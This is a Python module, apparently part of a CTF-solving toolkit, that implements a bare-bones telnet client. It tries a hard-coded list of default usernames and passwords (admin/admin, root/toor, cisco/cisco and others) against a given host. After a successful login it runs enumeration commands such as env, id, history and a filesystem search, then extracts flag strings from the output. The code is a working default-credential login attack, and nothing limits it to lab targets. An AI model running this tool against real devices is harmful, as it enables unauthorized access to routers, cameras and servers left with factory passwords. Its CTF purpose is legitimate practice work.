"""Telnet 远程登录解题工具（c-07 等远程登录/设备题）。

能力：极小 telnet 客户端（处理 IAC 协商）→ 默认凭据尝试登录 →
执行枚举命令（ls/cat flag*/find/env）→ 从输出提取 flag{...}。
无外部依赖（纯 socket），可放进离线容器。
"""
from __future__ import annotations

import re
import socket
import time

FLAG_RE = re.compile(r"(?:flag|FLAG)\{[^}\s\n]{1,200}\}")

# 常见默认凭据（CTF/设备题高频）
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", ""), ("root", "root"),
    ("root", "toor"), ("root", "123456"), ("root", "password"), ("root", ""),
    ("test", "test"), ("user", "user"), ("guest", "guest"),
    ("admin", "admin888"), ("admin", "12345678"), ("cisco", "cisco"),
]

ENUM_COMMANDS = [
    "ls -la",
    "cat flag.txt 2>/dev/null; cat flag 2>/dev/null; cat /flag.txt 2>/dev/null; cat /flag 2>/dev/null",
    "find / -maxdepth 3 -iname '*flag*' 2>/dev/null",
    "env",
    "id",
    "history",
    "cat /etc/motd 2>/dev/null",
]

PROMPT_MARKS = (b"$", b"#", b">", b"%")


def _send(sock: socket.socket, data: bytes) -> None:
    sock.sendall(data)


def _recv_until(sock: socket.socket, marks: tuple[bytes], timeout: float,
                max_bytes: int = 16384) -> bytes:
    """读取直到出现提示符/关键字或超时。同时吃掉 IAC 协商字节。"""
    sock.settimeout(timeout)
    data = b""
    deadline = time.time() + timeout
    while time.time() < deadline and len(data) < max_bytes:
        try:
            chunk = sock.recv(1024)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        # 处理 IAC 协商：对 WILL/WONT/DO/DONT 一律回绝；跳过子协商
        i = 0
        clean = bytearray()
        while i < len(chunk):
            b = chunk[i]
            if b == 0xFF and i + 1 < len(chunk):
                cmd = chunk[i + 1]
                if cmd in (0xFB, 0xFC):   # WILL/WONT
                    clean.extend(b"\xff\xfe" if cmd == 0xFB else b"\xff\xfc")
                    if i + 2 < len(chunk):
                        clean.append(chunk[i + 2])
                    i += 3
                    continue
                if cmd in (0xFD, 0xFE):   # DO/DONT
                    clean.extend(b"\xff\xfc" if cmd == 0xFD else b"\xff\xfe")
                    if i + 2 < len(chunk):
                        clean.append(chunk[i + 2])
                    i += 3
                    continue
                if cmd == 0xFA:           # SB 子协商：跳到 IAC SE
                    end = chunk.find(b"\xff\xf0", i + 2)
                    i = end + 2 if end != -1 else len(chunk)
                    continue
            clean.append(b)
            i += 1
        data += bytes(clean)
        # 出现登录/密码/命令提示符即返回
        tail = data[-64:].lower()
        if any(m in data for m in (b"login:", b"username:", b"user:", b"password:")):
            break
        if any(data.rstrip().endswith(m) for m in marks):
            break
    return data


def _try_login(host: str, port: int, timeout: float) -> socket.socket | None:
    """依次尝试默认凭据。成功返回已登录的 socket（读到命令提示符）。"""
    for user, pwd in DEFAULT_CREDS:
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            banner = _recv_until(s, PROMPT_MARKS, timeout)
            # 等用户名提示
            if not any(m in banner.lower() for m in (b"login", b"username", b"user")):
                if any(banner.rstrip().endswith(m) for m in PROMPT_MARKS):
                    pass  # 无登录提示（开放 shell）→ 直接当已登录
                else:
                    _send(s, b"\r\n")
                    banner += _recv_until(s, PROMPT_MARKS, timeout)
            _send(s, user.encode() + b"\r\n")
            resp = _recv_until(s, (b"password", b"passwd", b"pwd") + PROMPT_MARKS, timeout)
            if b"password" in resp.lower():
                _send(s, pwd.encode() + b"\r\n")
                shell = _recv_until(s, PROMPT_MARKS, timeout)
            else:
                shell = resp
            if any(shell.rstrip().endswith(m) for m in PROMPT_MARKS):
                return s
            s.close()
        except OSError:
            continue
    return None


def run(host: str, port: int = 23, timeout: float = 30.0) -> dict:
    """工具入口：返回 {ok, login, outputs, flags}。"""
    sock = _try_login(host, port, timeout)
    if sock is None:
        return {"ok": False, "error": "no default credential worked", "flags": []}
    outputs: list[dict] = []
    flags: list[str] = []
    try:
        for cmd in ENUM_COMMANDS:
            _send(sock, cmd.encode() + b"\r\n")
            out = _recv_until(sock, PROMPT_MARKS, timeout=8)
            text = out.decode("utf-8", "replace")
            outputs.append({"command": cmd, "output": text[:2000]})
            flags.extend(FLAG_RE.findall(text))
            if flags:
                break
    finally:
        sock.close()
    return {"ok": True, "login": True, "outputs": outputs,
            "flags": list(dict.fromkeys(flags))}


if __name__ == "__main__":
    import json
    import sys
    if len(sys.argv) < 2:
        print("usage: python -m huntforge.tools.telnet_login HOST [PORT]")
        sys.exit(1)
    print(json.dumps(run(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 23),
                     ensure_ascii=False, indent=2))
